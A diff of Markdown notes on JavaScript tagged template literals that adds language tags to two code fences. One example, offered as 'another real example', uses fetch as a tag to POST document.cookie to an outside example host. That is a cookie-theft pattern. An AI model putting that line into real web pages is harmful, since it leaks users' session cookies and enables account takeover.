@@ -573,7 +573,7 @@ console.log("Fifteen is " + (a + b) + " and\nnot " + (2 * a + b) + ".");
 ###### [Tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates)
 Tags allow you to parse template literals with a function. The first argument of a tag function contains an array of string values. The remaining arguments are related to the expressions.
 For [example](https://codeburst.io/javascript-template-literals-tag-functions-for-beginners-758a041160e1): 
-```
+```javascript
 // TAG FUNCTION
 greet`I'm ${name}. I'm ${age} years old.`
 // EQUIVALENT FUNCTION
@@ -581,7 +581,7 @@ greet(["I'm ", ". I'm ", " years old."], name, age)
 ```
 
 Another real example:
-```
+```javascript
 // TAG FUNCTION
 fetch`https://example.org/data${{mode:'no-cors', method:'POST', body: document.cookie}}`
 // EQUIVALENT FUNCTION
